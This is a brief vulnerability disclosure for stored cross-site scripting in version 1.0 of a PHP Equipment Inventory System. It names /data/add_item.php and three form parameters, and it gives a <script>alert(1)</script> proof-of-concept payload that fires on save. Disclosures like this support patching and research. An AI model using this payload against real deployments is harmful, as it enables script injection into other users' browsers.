# Equipment Inventory System-XSS

### Date: 2022-08/22



### Exploit Author: anx0ing@gmail.com



### Vendor Homepage: 

[https://www.sourcecodester.com](https://www.sourcecodester.com/)



### Software Link: 

https://www.sourcecodester.com/php/11327/equipment-inventory.html



### Version: 1.0



### /data/add_item.php

> `Generic Name`、`Item Code:`、`Brand Name`Parameters have Cross Site Scripting(XSS)

![image-20220807230905054](https://cdn.jsdelivr.net/gh/beytagh001/blog-img/image-20220807230905054.png)



**payload**

```
<script>alert(1)</script>
```

![image-20220807225859771](https://cdn.jsdelivr.net/gh/beytagh001/blog-img/image-20220807225859771.png)

> The save will trigger
